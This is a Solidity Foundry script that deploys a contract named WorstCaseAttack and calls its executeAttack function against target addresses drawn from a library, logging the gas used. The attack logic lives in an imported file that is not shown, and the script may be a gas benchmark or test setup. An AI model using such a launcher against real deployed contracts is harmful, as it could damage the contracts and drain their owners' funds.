// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/WorstCaseAttack.sol";
import "../src/AddressList.sol";

contract DeployAndAttackScript is Script {
    function run() external {
        // Fetch private key from environment variable
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // Get target contract addresses from the library
        address[] memory targetContracts = AddressList.getTargetAddresses();
        
        // Start broadcasting transactions
        vm.startBroadcast(attackerPrivateKey);
        
        // 1. Deploy the attack contract
        WorstCaseAttack attackContract = new WorstCaseAttack();
        console.log("Attack contract deployed at:", address(attackContract));
        
        // 2. Execute the attack
        console.log("Executing attack against", targetContracts.length, "contracts...");
        
        // Estimate gas for the attack
        uint256 gasEstimate = gasleft();
        attackContract.executeAttack(targetContracts);
        gasEstimate = gasEstimate - gasleft();
        
        console.log("Attack executed, estimated gas used:", gasEstimate);
        
        vm.stopBroadcast();
    }
} 